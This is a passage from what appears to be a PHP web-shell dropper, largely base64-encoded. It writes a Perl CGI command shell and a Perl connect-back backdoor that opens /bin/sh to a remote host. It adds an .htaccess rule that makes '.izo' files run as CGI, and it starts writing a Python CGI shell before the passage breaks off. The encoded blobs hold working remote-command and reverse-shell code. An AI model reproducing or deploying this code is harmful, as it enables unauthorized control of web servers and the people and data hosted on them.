rSkpFWnBiR1ZWY213Z1BYNGdjeThvVzE1aExYcEJMVm93TFRsZEtTOG5KU2N1ZFc1d1lXTnJLQ0pJCktpSXNKREVwTDJWbk93MEtDUWtrUkc5M2JteHZZV1JNYVc1cklEMGdJaVJUWTNKcGNIUk1iMk5oZEdsdmJqOWhQV1J2ZDI1c2IyRmsKSm1ZOUpFWnBiR1ZWY213bWJ6MW5ieUk3RFFvSkNTUklkRzFzVFdWMFlVaGxZV1JsY2lBOUlDSThiV1YwWVNCSVZGUlFMVVZSVlVsVwpQVndpVW1WbWNtVnphRndpSUVOUFRsUkZUbFE5WENJeE95QlZVa3c5SkVSdmQyNXNiMkZrVEdsdWExd2lQaUk3RFFvSkNTWlFjbWx1CmRGQmhaMlZJWldGa1pYSW9JbU1pS1RzTkNna0pjSEpwYm5RZ1BEeEZUa1E3RFFvOFkyOWtaVDROQ2cwS1UyVnVaR2x1WnlCR2FXeGwKSUNSVWNtRnVjMlpsY2tacGJHVXVMaTQ4WW5JK0RRcEpaaUIwYUdVZ1pHOTNibXh2WVdRZ1pHOWxjeUJ1YjNRZ2MzUmhjblFnWVhWMApiMjFoZEdsallXeHNlU3dOQ2p4aElHaHlaV1k5SWlSRWIzZHViRzloWkV4cGJtc2lQa05zYVdOcklFaGxjbVU4TDJFK0xnMEtSVTVFCkRRb0pDU1pRY21sdWRFTnZiVzFoYm1STWFXNWxTVzV3ZFhSR2IzSnRPdzBLQ1FrbVVISnBiblJRWVdkbFJtOXZkR1Z5T3cwS0NYME4KQ2dsbGJITmxJQ01nWm1sc1pTQmtiMlZ6YmlkMElHVjRhWE4wRFFvSmV3MEtDUWttVUhKcGJuUlFZV2RsU0dWaFpHVnlLQ0ptSWlrNwpEUW9KQ1hCeWFXNTBJQ0pHWVdsc1pXUWdkRzhnWkc5M2JteHZZV1FnSkVacGJHVlZjbXc2SUNRaElqc05DZ2tKSmxCeWFXNTBSbWxzClpVUnZkMjVzYjJGa1JtOXliVHNOQ2drSkpsQnlhVzUwVUdGblpVWnZiM1JsY2pzTkNnbDlEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzBOQ2lNZ1ZHaHBjeUJtZFc1amRHbHZiaUJ5WldGa2N5QjBhR1VnYzNCbFkybG1hV1ZrSUdacGJHVWdabkp2CmJTQjBhR1VnWkdsemF5QmhibVFnYzJWdVpITWdhWFFnZEc4Z2RHaGxEUW9qSUdKeWIzZHpaWElzSUhOdklIUm9ZWFFnYVhRZ1kyRnUKSUdKbElHUnZkMjVzYjJGa1pXUWdZbmtnZEdobElIVnpaWEl1RFFvaklFRnlaM1Z0Wlc1MElERTZJRVoxYkd4NUlIRjFZV3hwWm1sbApaQ0J3WVhSb2JtRnRaU0J2WmlCMGFHVWdabWxzWlNCMGJ5QmlaU0J6Wlc1MExnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFEwS2MzVmlJRk5sYm1SR2FXeGxWRzlDY205M2MyVnlEUXA3RFFvSmJHOWpZV3dvSkZObGJtUkdhV3hsS1NBOUlFQmZPdzBLQ1dsbQpLRzl3Wlc0b1UwVk9SRVpKVEVVc0lDUlRaVzVrUm1sc1pTa3BJQ01nWm1sc1pTQnZjR1Z1WldRZ1ptOXlJSEpsWVdScGJtY05DZ2w3CkRRb0pDV2xtS0NSWGFXNU9WQ2tOQ2drSmV3MEtDUWtKWW1sdWJXOWtaU2hUUlU1RVJrbE1SU2s3RFFvSkNRbGlhVzV0YjJSbEtGTlUKUkU5VlZDazdEUW9KQ1gwTkNna0pKRVpwYkdWVGFYcGxJRDBnS0hOMFlYUW9KRk5sYm1SR2FXeGxLU2xiTjEwN0RRb0pDU2drUm1scwpaVzVoYldVZ1BTQWtVMlZ1WkVacGJHVXBJRDErSUNCdElTaGJYaTllWEZ4ZEtpa2tJVHNOQ2drSmNISnBiblFnSWtOdmJuUmxiblF0ClZIbHdaVG9nWVhCd2JHbGpZWFJwYjI0dmVDMTFibXR1YjNkdVhHNGlPdzBLQ1Fsd2NtbHVkQ0FpUTI5dWRHVnVkQzFNWlc1bmRHZzYKSUNSR2FXeGxVMmw2WlZ4dUlqc05DZ2tKY0hKcGJuUWdJa052Ym5SbGJuUXRSR2x6Y0c5emFYUnBiMjQ2SUdGMGRHRmphRzFsYm5RNwpJR1pwYkdWdVlXMWxQU1F4WEc1Y2JpSTdEUW9KQ1hCeWFXNTBJSGRvYVd4bEtEeFRSVTVFUmtsTVJUNHBPdzBLQ1FsamJHOXpaU2hUClJVNUVSa2xNUlNrN0RRb0pmUTBLQ1dWc2MyVWdJeUJtWVdsc1pXUWdkRzhnYjNCbGJpQm1hV3hsRFFvSmV3MEtDUWttVUhKcGJuUlEKWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1hCeWFXNTBJQ0pHWVdsc1pXUWdkRzhnWkc5M2JteHZZV1FnSkZObGJtUkdhV3hsT2lBawpJU0k3RFFvSkNTWlFjbWx1ZEVacGJHVkViM2R1Ykc5aFpFWnZjbTA3RFFvTkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2w5CkRRcDlEUW9OQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJVYUdseklHWjFibU4wYVc5dUlHbHpJR05oYkd4bApaQ0IzYUdWdUlIUm9aU0IxYzJWeUlHUnZkMjVzYjJGa2N5QmhJR1pwYkdVdUlFbDBJR1JwYzNCc1lYbHpJR0VnYldWemMyRm5aUTBLCkl5QjBieUIwYUdVZ2RYTmxjaUJoYm1RZ2NISnZkbWxrWlhNZ1lTQnNhVzVySUhSb2NtOTFaMmdnZDJocFkyZ2dkR2hsSUdacGJHVWcKWTJGdUlHSmxJR1J2ZDI1c2IyRmtaV1F1RFFvaklGUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ1lXeHpieUJqWVd4c1pXUWdkMmhsYmlCMAphR1VnZFhObGNpQmpiR2xqYTNNZ2IyNGdkR2hoZENCc2FXNXJMaUJKYmlCMGFHbHpJR05oYzJVc0RRb2pJSFJvWlNCbWFXeGxJR2x6CklISmxZV1FnWVc1a0lITmxiblFnZEc4Z2RHaGxJR0p5YjNkelpYSXVEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFwegpkV0lnUW1WbmFXNUViM2R1Ykc5aFpBMEtldzBLQ1NNZ1oyVjBJR1oxYkd4NUlIRjFZV3hwWm1sbFpDQndZWFJvSUc5bUlIUm9aU0JtCmFXeGxJSFJ2SUdKbElHUnZkMjVzYjJGa1pXUU5DZ2xwWmlnb0pGZHBiazVVSUNZZ0tDUlVjbUZ1YzJabGNrWnBiR1VnUFg0Z2JTOWUKWEZ4OFhpNDZMeWtwSUh3TkNna0pLQ0VrVjJsdVRsUWdKaUFvSkZSeVlXNXpabVZ5Um1sc1pTQTlmaUJ0TDE1Y0x5OHBLU2tnSXlCdwpZWFJvSUdseklHRmljMjlzZFhSbERRb0pldzBLQ1Fra1ZHRnlaMlYwUm1sc1pTQTlJQ1JVY21GdWMyWmxja1pwYkdVN0RRb0pmUTBLCkNXVnNjMlVnSXlCd1lYUm9JR2x6SUhKbGJHRjBhWFpsRFFvSmV3MEtDUWxqYUc5d0tDUlVZWEpuWlhSR2FXeGxLU0JwWmlna1ZHRnkKWjJWMFJtbHNaU0E5SUNSRGRYSnlaVzUwUkdseUtTQTlmaUJ0TDF0Y1hGd3ZYU1F2T3cwS0NRa2tWR0Z5WjJWMFJtbHNaU0F1UFNBawpVR0YwYUZObGNDNGtWSEpoYm5ObVpYSkdhV3hsT3cwS0NYME5DZzBLQ1dsbUtDUlBjSFJwYjI1eklHVnhJQ0puYnlJcElDTWdkMlVnCmFHRjJaU0IwYnlCelpXNWtJSFJvWlNCbWFXeGxEUW9KZXcwS0NRa21VMlZ1WkVacGJHVlViMEp5YjNkelpYSW9KRlJoY21kbGRFWnAKYkdVcE93MEtDWDBOQ2dsbGJITmxJQ01nZDJVZ2FHRjJaU0IwYnlCelpXNWtJRzl1YkhrZ2RHaGxJR3hwYm1zZ2NHRm5aUTBLQ1hzTgpDZ2tKSmxCeWFXNTBSRzkzYm14dllXUk1hVzVyVUdGblpTZ2tWR0Z5WjJWMFJtbHNaU2s3RFFvSmZRMEtmUTBLRFFvakxTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHREUW9qSUZSb2FYTWdablZ1WTNScGIyNGdhWE1nWTJGc2JHVmtJSGRvWlc0Z2RHaGxJSFZ6WlhJZwpkMkZ1ZEhNZ2RHOGdkWEJzYjJGa0lHRWdabWxzWlM0Z1NXWWdkR2hsRFFvaklHWnBiR1VnYVhNZ2JtOTBJSE53WldOcFptbGxaQ3dnCmFYUWdaR2x6Y0d4aGVYTWdZU0JtYjNKdElHRnNiRzkzYVc1bklIUm9aU0IxYzJWeUlIUnZJSE53WldOcFpua2dZUTBLSXlCbWFXeGwKTENCdmRHaGxjbmRwYzJVZ2FYUWdjM1JoY25SeklIUm9aU0IxY0d4dllXUWdjSEp2WTJWemN5NE5DaU10TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwTkNuTjFZaUJWY0d4dllXUkdhV3hsRFFwN0RRb0pJeUJwWmlCdWJ5Qm1hV3hsSUdseklITndaV05wWm1sbFpDd2cKY0hKcGJuUWdkR2hsSUhWd2JHOWhaQ0JtYjNKdElHRm5ZV2x1RFFvSmFXWW9KRlJ5WVc1elptVnlSbWxzWlNCbGNTQWlJaWtOQ2dsNwpEUW9KQ1NaUWNtbHVkRkJoWjJWSVpXRmtaWElvSW1ZaUtUc05DZ2tKSmxCeWFXNTBSbWxzWlZWd2JHOWhaRVp2Y20wN0RRb0pDU1pRCmNtbHVkRkJoWjJWR2IyOTBaWEk3RFFvSkNYSmxkSFZ5YmpzTkNnbDlEUW9KSmxCeWFXNTBVR0ZuWlVobFlXUmxjaWdpWXlJcE93MEsKRFFvSkl5QnpkR0Z5ZENCMGFHVWdkWEJzYjJGa2FXNW5JSEJ5YjJObGMzTU5DZ2x3Y21sdWRDQWlWWEJzYjJGa2FXNW5JQ1JVY21GdQpjMlpsY2tacGJHVWdkRzhnSkVOMWNuSmxiblJFYVhJdUxpNDhZbkkrSWpzTkNnMEtDU01nWjJWMElIUm9aU0JtZFd4c2JIa2djWFZoCmJHbG1hV1ZrSUhCaGRHaHVZVzFsSUc5bUlIUm9aU0JtYVd4bElIUnZJR0psSUdOeVpXRjBaV1FOQ2dsamFHOXdLQ1JVWVhKblpYUk8KWVcxbEtTQnBaaUFvSkZSaGNtZGxkRTVoYldVZ1BTQWtRM1Z5Y21WdWRFUnBjaWtnUFg0Z2JTOWJYRnhjTDEwa0x6c05DZ2trVkhKaApibk5tWlhKR2FXeGxJRDErSUcwaEtGdGVMMTVjWEYwcUtTUWhPdzBLQ1NSVVlYSm5aWFJPWVcxbElDNDlJQ1JRWVhSb1UyVndMaVF4Ck93MEtEUW9KSkZSaGNtZGxkRVpwYkdWVGFYcGxJRDBnYkdWdVozUm9LQ1JwYm5zblptbHNaV1JoZEdFbmZTazdEUW9KSXlCcFppQjAKYUdVZ1ptbHNaU0JsZUdsemRITWdZVzVrSUhkbElHRnlaU0J1YjNRZ2MzVndjRzl6WldRZ2RHOGdiM1psY25keWFYUmxJR2wwRFFvSgphV1lvTFdVZ0pGUmhjbWRsZEU1aGJXVWdKaVlnSkU5d2RHbHZibk1nYm1VZ0ltOTJaWEozY21sMFpTSXBEUW9KZXcwS0NRbHdjbWx1CmRDQWlSbUZwYkdWa09pQkVaWE4wYVc1aGRHbHZiaUJtYVd4bElHRnNjbVZoWkhrZ1pYaHBjM1J6TGp4aWNqNGlPdzBLQ1gwTkNnbGwKYkhObElDTWdabWxzWlNCcGN5QnViM1FnY0hKbGMyVnVkQTBLQ1hzTkNna0phV1lvYjNCbGJpaFZVRXhQUVVSR1NVeEZMQ0FpUGlSVQpZWEpuWlhST1lXMWxJaWtwRFFvSkNYc05DZ2tKQ1dKcGJtMXZaR1VvVlZCTVQwRkVSa2xNUlNrZ2FXWWdKRmRwYms1VU93MEtDUWtKCmNISnBiblFnVlZCTVQwRkVSa2xNUlNBa2FXNTdKMlpwYkdWa1lYUmhKMzA3RFFvSkNRbGpiRzl6WlNoVlVFeFBRVVJHU1V4RktUc04KQ2drSkNYQnlhVzUwSUNKVWNtRnVjMlpsY21Wa0lDUlVZWEpuWlhSR2FXeGxVMmw2WlNCQ2VYUmxjeTQ4WW5JK0lqc05DZ2tKQ1hCeQphVzUwSUNKR2FXeGxJRkJoZEdnNklDUlVZWEpuWlhST1lXMWxQR0p5UGlJN0RRb0pDWDBOQ2drSlpXeHpaUTBLQ1FsN0RRb0pDUWx3CmNtbHVkQ0FpUm1GcGJHVmtPaUFrSVR4aWNqNGlPdzBLQ1FsOURRb0pmUTBLQ1hCeWFXNTBJQ0lpT3cwS0NTWlFjbWx1ZEVOdmJXMWgKYm1STWFXNWxTVzV3ZFhSR2IzSnRPdzBLRFFvSkpsQnlhVzUwVUdGblpVWnZiM1JsY2pzTkNuME5DZzBLSXkwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExRMEtJeUJVYUdseklHWjFibU4wYVc5dUlHbHpJR05oYkd4bFpDQjNhR1Z1SUhSb1pTQjFjMlZ5SUhkaGJuUnoKSUhSdklHUnZkMjVzYjJGa0lHRWdabWxzWlM0Z1NXWWdkR2hsRFFvaklHWnBiR1Z1WVcxbElHbHpJRzV2ZENCemNHVmphV1pwWldRcwpJR2wwSUdScGMzQnNZWGx6SUdFZ1ptOXliU0JoYkd4dmQybHVaeUIwYUdVZ2RYTmxjaUIwYnlCemNHVmphV1o1SUdFTkNpTWdabWxzClpTd2diM1JvWlhKM2FYTmxJR2wwSUdScGMzQnNZWGx6SUdFZ2JXVnpjMkZuWlNCMGJ5QjBhR1VnZFhObGNpQmhibVFnY0hKdmRtbGsKWlhNZ1lTQnNhVzVyRFFvaklIUm9jbTkxWjJnZ0lIZG9hV05vSUhSb1pTQm1hV3hsSUdOaGJpQmlaU0JrYjNkdWJHOWhaR1ZrTGcwSwpJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLYzNWaUlFUnZkMjVzYjJGa1JtbHNaUTBLZXcwS0NTTWdhV1lnYm04Z1ptbHMKWlNCcGN5QnpjR1ZqYVdacFpXUXNJSEJ5YVc1MElIUm9aU0JrYjNkdWJHOWhaQ0JtYjNKdElHRm5ZV2x1RFFvSmFXWW9KRlJ5WVc1egpabVZ5Um1sc1pTQmxjU0FpSWlrTkNnbDdEUW9KQ1NaUWNtbHVkRkJoWjJWSVpXRmtaWElvSW1ZaUtUc05DZ2tKSmxCeWFXNTBSbWxzClpVUnZkMjVzYjJGa1JtOXliVHNOQ2drSkpsQnlhVzUwVUdGblpVWnZiM1JsY2pzTkNna0pjbVYwZFhKdU93MEtDWDBOQ2drTkNna2oKSUdkbGRDQm1kV3hzZVNCeGRXRnNhV1pwWldRZ2NHRjBhQ0J2WmlCMGFHVWdabWxzWlNCMGJ5QmlaU0JrYjNkdWJHOWhaR1ZrRFFvSgphV1lvS0NSWGFXNU9WQ0FtSUNna1ZISmhibk5tWlhKR2FXeGxJRDErSUcwdlhseGNmRjR1T2k4cEtTQjhEUW9KQ1NnaEpGZHBiazVVCklDWWdLQ1JVY21GdWMyWmxja1pwYkdVZ1BYNGdiUzllWEM4dktTa3BJQ01nY0dGMGFDQnBjeUJoWW5OdmJIVjBaUTBLQ1hzTkNna0oKSkZSaGNtZGxkRVpwYkdVZ1BTQWtWSEpoYm5ObVpYSkdhV3hsT3cwS0NYME5DZ2xsYkhObElDTWdjR0YwYUNCcGN5QnlaV3hoZEdsMgpaUTBLQ1hzTkNna0pZMmh2Y0Nna1ZHRnlaMlYwUm1sc1pTa2dhV1lvSkZSaGNtZGxkRVpwYkdVZ1BTQWtRM1Z5Y21WdWRFUnBjaWtnClBYNGdiUzliWEZ4Y0wxMGtMenNOQ2drSkpGUmhjbWRsZEVacGJHVWdMajBnSkZCaGRHaFRaWEF1SkZSeVlXNXpabVZ5Um1sc1pUc04KQ2dsOURRb05DZ2xwWmlna1QzQjBhVzl1Y3lCbGNTQWlaMjhpS1NBaklIZGxJR2hoZG1VZ2RHOGdjMlZ1WkNCMGFHVWdabWxzWlEwSwpDWHNOQ2drSkpsTmxibVJHYVd4bFZHOUNjbTkzYzJWeUtDUlVZWEpuWlhSR2FXeGxLVHNOQ2dsOURRb0paV3h6WlNBaklIZGxJR2hoCmRtVWdkRzhnYzJWdVpDQnZibXg1SUhSb1pTQnNhVzVySUhCaFoyVU5DZ2w3RFFvSkNTWlFjbWx1ZEVSdmQyNXNiMkZrVEdsdWExQmgKWjJVb0pGUmhjbWRsZEVacGJHVXBPdzBLQ1gwTkNuME5DZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5Qk5ZV2x1CklGQnliMmR5WVcwZ0xTQkZlR1ZqZFhScGIyNGdVM1JoY25SeklFaGxjbVVOQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTgpDaVpTWldGa1VHRnljMlU3RFFvbVIyVjBRMjl2YTJsbGN6c05DZzBLSkZOamNtbHdkRXh2WTJGMGFXOXVJRDBnSkVWT1Zuc25VME5TClNWQlVYMDVCVFVVbmZUc05DaVJUWlhKMlpYSk9ZVzFsSUQwZ0pFVk9WbnNuVTBWU1ZrVlNYMDVCVFVVbmZUc05DaVJNYjJkcGJsQmgKYzNOM2IzSmtJRDBnSkdsdWV5ZHdKMzA3RFFva1VuVnVRMjl0YldGdVpDQTlJQ1JwYm5zbll5ZDlPdzBLSkZSeVlXNXpabVZ5Um1scwpaU0E5SUNScGJuc25aaWQ5T3cwS0pFOXdkR2x2Ym5NZ1BTQWthVzU3SjI4bmZUc05DZzBLSkVGamRHbHZiaUE5SUNScGJuc25ZU2Q5Ck93MEtKRUZqZEdsdmJpQTlJQ0pzYjJkcGJpSWdhV1lvSkVGamRHbHZiaUJsY1NBaUlpazdJQ01nYm04Z1lXTjBhVzl1SUhOd1pXTnAKWm1sbFpDd2dkWE5sSUdSbFptRjFiSFFOQ2cwS0l5Qm5aWFFnZEdobElHUnBjbVZqZEc5eWVTQnBiaUIzYUdsamFDQjBhR1VnWTI5dApiV0Z1WkhNZ2QybHNiQ0JpWlNCbGVHVmpkWFJsWkEwS0pFTjFjbkpsYm5SRWFYSWdQU0FrYVc1N0oyUW5mVHNOQ21Ob2IzQW9KRU4xCmNuSmxiblJFYVhJZ1BTQmdKRU50WkZCM1pHQXBJR2xtS0NSRGRYSnlaVzUwUkdseUlHVnhJQ0lpS1RzTkNnMEtKRXh2WjJkbFpFbHUKSUQwZ0pFTnZiMnRwWlhON0oxTkJWa1ZFVUZkRUozMGdaWEVnSkZCaGMzTjNiM0prT3cwS0RRcHBaaWdrUVdOMGFXOXVJR1Z4SUNKcwpiMmRwYmlJZ2ZId2dJU1JNYjJkblpXUkpiaWtnSXlCMWMyVnlJRzVsWldSekwyaGhjeUIwYnlCc2IyZHBiZzBLZXcwS0NTWlFaWEptCmIzSnRURzluYVc0N0RRb05DbjBOQ21Wc2MybG1LQ1JCWTNScGIyNGdaWEVnSW1OdmJXMWhibVFpS1NBaklIVnpaWElnZDJGdWRITWcKZEc4Z2NuVnVJR0VnWTI5dGJXRnVaQTBLZXcwS0NTWkZlR1ZqZFhSbFEyOXRiV0Z1WkRzTkNuME5DbVZzYzJsbUtDUkJZM1JwYjI0ZwpaWEVnSW5Wd2JHOWhaQ0lwSUNNZ2RYTmxjaUIzWVc1MGN5QjBieUIxY0d4dllXUWdZU0JtYVd4bERRcDdEUW9KSmxWd2JHOWhaRVpwCmJHVTdEUXA5RFFwbGJITnBaaWdrUVdOMGFXOXVJR1Z4SUNKa2IzZHViRzloWkNJcElDTWdkWE5sY2lCM1lXNTBjeUIwYnlCa2IzZHUKYkc5aFpDQmhJR1pwYkdVTkNuc05DZ2ttUkc5M2JteHZZV1JHYVd4bE93MEtmUTBLWld4emFXWW9KRUZqZEdsdmJpQmxjU0FpYkc5bgpiM1YwSWlrZ0l5QjFjMlZ5SUhkaGJuUnpJSFJ2SUd4dloyOTFkQTBLZXcwS0NTWlFaWEptYjNKdFRHOW5iM1YwT3cwS2ZRPT0nOwoKJGZpbGUgPSBmb3BlbigiaXpvLmNpbiIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjZ2lzaGVsbGl6b2NpbikpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoIml6by5jaW4iLDA3NTUpOwokbmV0Y2F0c2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNEUW9nSUNBZ0lDQjFjMlVnVTI5amEyVjBPdzBLSUNBZ0lDQWdjSEpwYm5RZ0lrUmhkR0VnUTJoaApNSE1nUTI5dWJtVmpkQ0JDWVdOcklFSmhZMnRrYjI5eVhHNWNiaUk3RFFvZ0lDQWdJQ0JwWmlBb0lTUkJVa2RXV3pCZEtTQjdEUW9nCklDQWdJQ0FnSUhCeWFXNTBaaUFpVlhOaFoyVTZJQ1F3SUZ0SWIzTjBYU0E4VUc5eWRENWNiaUk3RFFvZ0lDQWdJQ0FnSUdWNGFYUW8KTVNrN0RRb2dJQ0FnSUNCOURRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lwZElFUjFiWEJwYm1jZ1FYSm5kVzFsYm5SelhHNGlPdzBLSUNBZwpJQ0FnSkdodmMzUWdQU0FrUVZKSFZsc3dYVHNOQ2lBZ0lDQWdJQ1J3YjNKMElEMGdPREE3RFFvZ0lDQWdJQ0JwWmlBb0pFRlNSMVpiCk1WMHBJSHNOQ2lBZ0lDQWdJQ0FnSkhCdmNuUWdQU0FrUVZKSFZsc3hYVHNOQ2lBZ0lDQWdJSDBOQ2lBZ0lDQWdJSEJ5YVc1MElDSmIKS2wwZ1EyOXVibVZqZEdsdVp5NHVMbHh1SWpzTkNpQWdJQ0FnSUNSd2NtOTBieUE5SUdkbGRIQnliM1J2WW5sdVlXMWxLQ2QwWTNBbgpLU0I4ZkNCa2FXVW9JbFZ1YTI1dmQyNGdVSEp2ZEc5amIyeGNiaUlwT3cwS0lDQWdJQ0FnYzI5amEyVjBLRk5GVWxaRlVpd2dVRVpmClNVNUZWQ3dnVTA5RFMxOVRWRkpGUVUwc0lDUndjbTkwYnlrZ2ZId2daR2xsSUNnaVUyOWphMlYwSUVWeWNtOXlYRzRpS1RzTkNpQWcKSUNBZ0lHMTVJQ1IwWVhKblpYUWdQU0JwYm1WMFgyRjBiMjRvSkdodmMzUXBPdzBLSUNBZ0lDQWdhV1lnS0NGamIyNXVaV04wS0ZORgpVbFpGVWl3Z2NHRmpheUFpVTI1Qk5IZzRJaXdnTWl3Z0pIQnZjblFzSUNSMFlYSm5aWFFwS1NCN0RRb2dJQ0FnSUNBZ0lHUnBaU2dpClZXNWhZbXhsSUhSdklFTnZibTVsWTNSY2JpSXBPdzBLSUNBZ0lDQWdmUTBLSUNBZ0lDQWdjSEpwYm5RZ0lsc3FYU0JUY0dGM2JtbHUKWnlCVGFHVnNiRnh1SWpzTkNpQWdJQ0FnSUdsbUlDZ2habTl5YXlnZ0tTa2dldzBLSUNBZ0lDQWdJQ0J2Y0dWdUtGTlVSRWxPTENJKwpKbE5GVWxaRlVpSXBPdzBLSUNBZ0lDQWdJQ0J2Y0dWdUtGTlVSRTlWVkN3aVBpWlRSVkpXUlZJaUtUc05DaUFnSUNBZ0lDQWdiM0JsCmJpaFRWRVJGVWxJc0lqNG1VMFZTVmtWU0lpazdEUW9nSUNBZ0lDQWdJR1Y0WldNZ2V5Y3ZZbWx1TDNOb0ozMGdKeTFpWVhOb0p5QXUKSUNKY01DSWdlQ0EwT3cwS0lDQWdJQ0FnSUNCbGVHbDBLREFwT3cwS0lDQWdJQ0FnZlEwS0lDQWdJQ0FnY0hKcGJuUWdJbHNxWFNCRQpZWFJoWTJobFpGeHVYRzRpT3c9PSc7CgokZmlsZSA9IGZvcGVuKCJkYy5wbCIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRuZXRjYXRzaGVsbCkpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoImRjLnBsIiwwNzU1KTsKZWNobyAiPGlmcmFtZSBzcmM9Y2dpc2hlbGwvaXpvLmNpbiB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTQnXSkpCnsKICAgIG1rZGlyKCdweXRob24nLCAwNzU1KTsKICAgIGNoZGlyKCdweXRob24nKTsKICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsKICAgICAgICAkZG9zeWFfYWRpID0gIiRrb2tkb3N5YSI7CiAgICAgICAgJGRvc3lhID0gZm9wZW4gKCRkb3N5YV9hZGkgLCAndycpIG9yIGRpZSAoIkRvc3lhIGHDp8SxbGFtYWTEsSEiKTsKICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICAKICAgICAgICBmd3JpdGUgKCAkZG9zeWEgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkZG9zeWEpOwokcHl0aG9ucCA9ICdJeUV2ZFhOeUwySnBiaTl3ZVhSb2IyNEtJeUF3Tnkwd055MHdOQW9qSUhZeExqQXVNQW9LSXlCaloya3RjMmhsYkd3dWNIa0tJeUJCCklITnBiWEJzWlNCRFIwa2dkR2hoZENCbGVHVmpkWFJsY3lCaGNtSnBkSEpoY25rZ2MyaGxiR3dnWTI5dGJXRnVaSE11Q2dvS0l5QkQKYjNCNWNtbG5hSFFnVFdsamFHRmxiQ0JHYjI5eVpBb2pJRmx2ZFNCaGNtVWdabkpsWlNCMGJ5QnRiMlJwWm5rc0lIVnpaU0JoYm1RZwpjbVZzYVdObGJuTmxJSFJvYVhNZ1kyOWtaUzRLQ2lNZ1RtOGdkMkZ5Y21GdWRIa2daWGh3Y21WemN5QnZjaUJwYlhCc2FXVmtJR1p2CmNpQjBhR1VnWVdOamRYSmhZM2tzSUdacGRHNWxjM01nZEc4Z2NIVnljRzl6WlNCdmNpQnZkR2hsY25kcGMyVWdabTl5SUhSb2FYTWcKWTI5a1pTNHVMaTRLSXlCVmMyVWdZWFFnZVc5MWNpQnZkMjRnY21semF5QWhJU0VLQ2lNZ1JTMXRZV2xzSUcxcFkyaGhaV3dnUVZRZwpabTl2Y21RZ1JFOVVJRzFsSUVSUFZDQjFhd29qSUUxaGFXNTBZV2x1WldRZ1lYUWdkM2QzTG5admFXUnpjR0ZqWlM1dmNtY3VkV3N2CllYUnNZVzUwYVdKdmRITXZjSGwwYUc5dWRYUnBiSE11YUhSdGJBb0tJaUlpQ2tFZ2MybHRjR3hsSUVOSFNTQnpZM0pwY0hRZ2RHOGcKWlhobFkzVjBaU0J6YUdWc2JDQmpiMjF0WVc1a2N5QjJhV0VnUTBkSkxnb2lJaUlLSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNagpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl3b2pJRWx0Y0c5eWRITUtkSEo1Ck9nb2dJQ0FnYVcxd2IzSjBJR05uYVhSaU95QmpaMmwwWWk1bGJtRmliR1VvS1FwbGVHTmxjSFE2Q2lBZ0lDQndZWE56Q21sdGNHOXkKZENCemVYTXNJR05uYVN3Z2IzTUtjM2x6TG5OMFpHVnljaUE5SUhON